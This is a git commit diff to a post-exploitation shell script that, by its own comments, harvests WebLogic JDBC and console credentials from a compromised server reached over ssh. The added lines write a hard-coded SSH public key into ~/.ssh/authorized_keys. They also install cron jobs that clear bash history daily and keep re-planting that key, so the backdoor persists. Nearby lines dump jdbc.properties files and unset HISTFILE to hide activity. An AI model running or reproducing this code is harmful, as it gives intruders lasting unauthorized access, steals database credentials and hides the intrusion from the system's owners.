59334511c8b9f7fd4e1edb3f266eac781fe7a771
hktalent <3135773@qq.com>
2018-10-03 17:12:33 +0800

    fix

--- tools/oneKeyGetSshWeblogicJdbcPswd.sh
+++ tools/oneKeyGetSshWeblogicJdbcPswd.sh
@@ -1,3 +1,4 @@
+mkdir ~/.ssh 2>/dev/null;echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsK7OsENqLwuH6pTrCBiNWNI0ByZZURaV+TS6l2P6cxWZpRAgVruyDk+XQ5pY9xJHTZfF75IT+ekWXA5hBe2eO8j+fAQuKaHgvlV8fTp48wMS0LRilfrslOsyv8DsrDs2ZSaiaraj7BwEBalaumczqBM0UoelCa7OvWJDqfyYK8ihQBYBXui/jvyb3FdRA9muOLFuo+AmhIyL3UMQ1jhUxrpmhAKxs6oUjMFXBj//TpvYL7AZXz+2MfmApHYSBx7vs+NodAOf9WShSPoHkuzz3riIsN3hBx66gGRGOPL00lvPsu/GS31klFKaGm3qFcHvO3uczRsaUGj89d/jUwBNh root@linuxkit-025000000001">~/.ssh/authorized_keys
 # 后渗透，一键破解weblogic jdbc、console用户名及密码
 # ssh -i YouKey userName@YouTargetIp -p targetPort < oneKeyGetSshWeblogicJdbcPswd.sh >out.txt
 # https://github.com/hktalent/myhktools 
@@ -97,6 +98,10 @@ rm -rf ./xxx.py
 echo "all jdbc.properties:"
 find ${sdomain} -type f -name "*jdbc*.properties"|xargs -I {} cat {} |grep -Ev "^#|^\s*$"
 
+echo "00 20 * * * cat /dev/null > ~/.bash_history" >/tmp/myX.sh
+echo '00 20 * * * mkdir ~/.ssh 2>/dev/null&&echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsK7OsENqLwuH6pTrCBiNWNI0ByZZURaV+TS6l2P6cxWZpRAgVruyDk+XQ5pY9xJHTZfF75IT+ekWXA5hBe2eO8j+fAQuKaHgvlV8fTp48wMS0LRilfrslOsyv8DsrDs2ZSaiaraj7BwEBalaumczqBM0UoelCa7OvWJDqfyYK8ihQBYBXui/jvyb3FdRA9muOLFuo+AmhIyL3UMQ1jhUxrpmhAKxs6oUjMFXBj//TpvYL7AZXz+2MfmApHYSBx7vs+NodAOf9WShSPoHkuzz3riIsN3hBx66gGRGOPL00lvPsu/GS31klFKaGm3qFcHvO3uczRsaUGj89d/jUwBNh root@linuxkit-025000000001">~/.ssh/authorized_keys' >>/tmp/myX.sh
+crontab -l >>/tmp/myX.sh
+`cat /tmp/myX.sh|sort -u | crontab -`
 rm /tmp/myX.sh
 rm ${tmpFl}
 unset HISTFILE
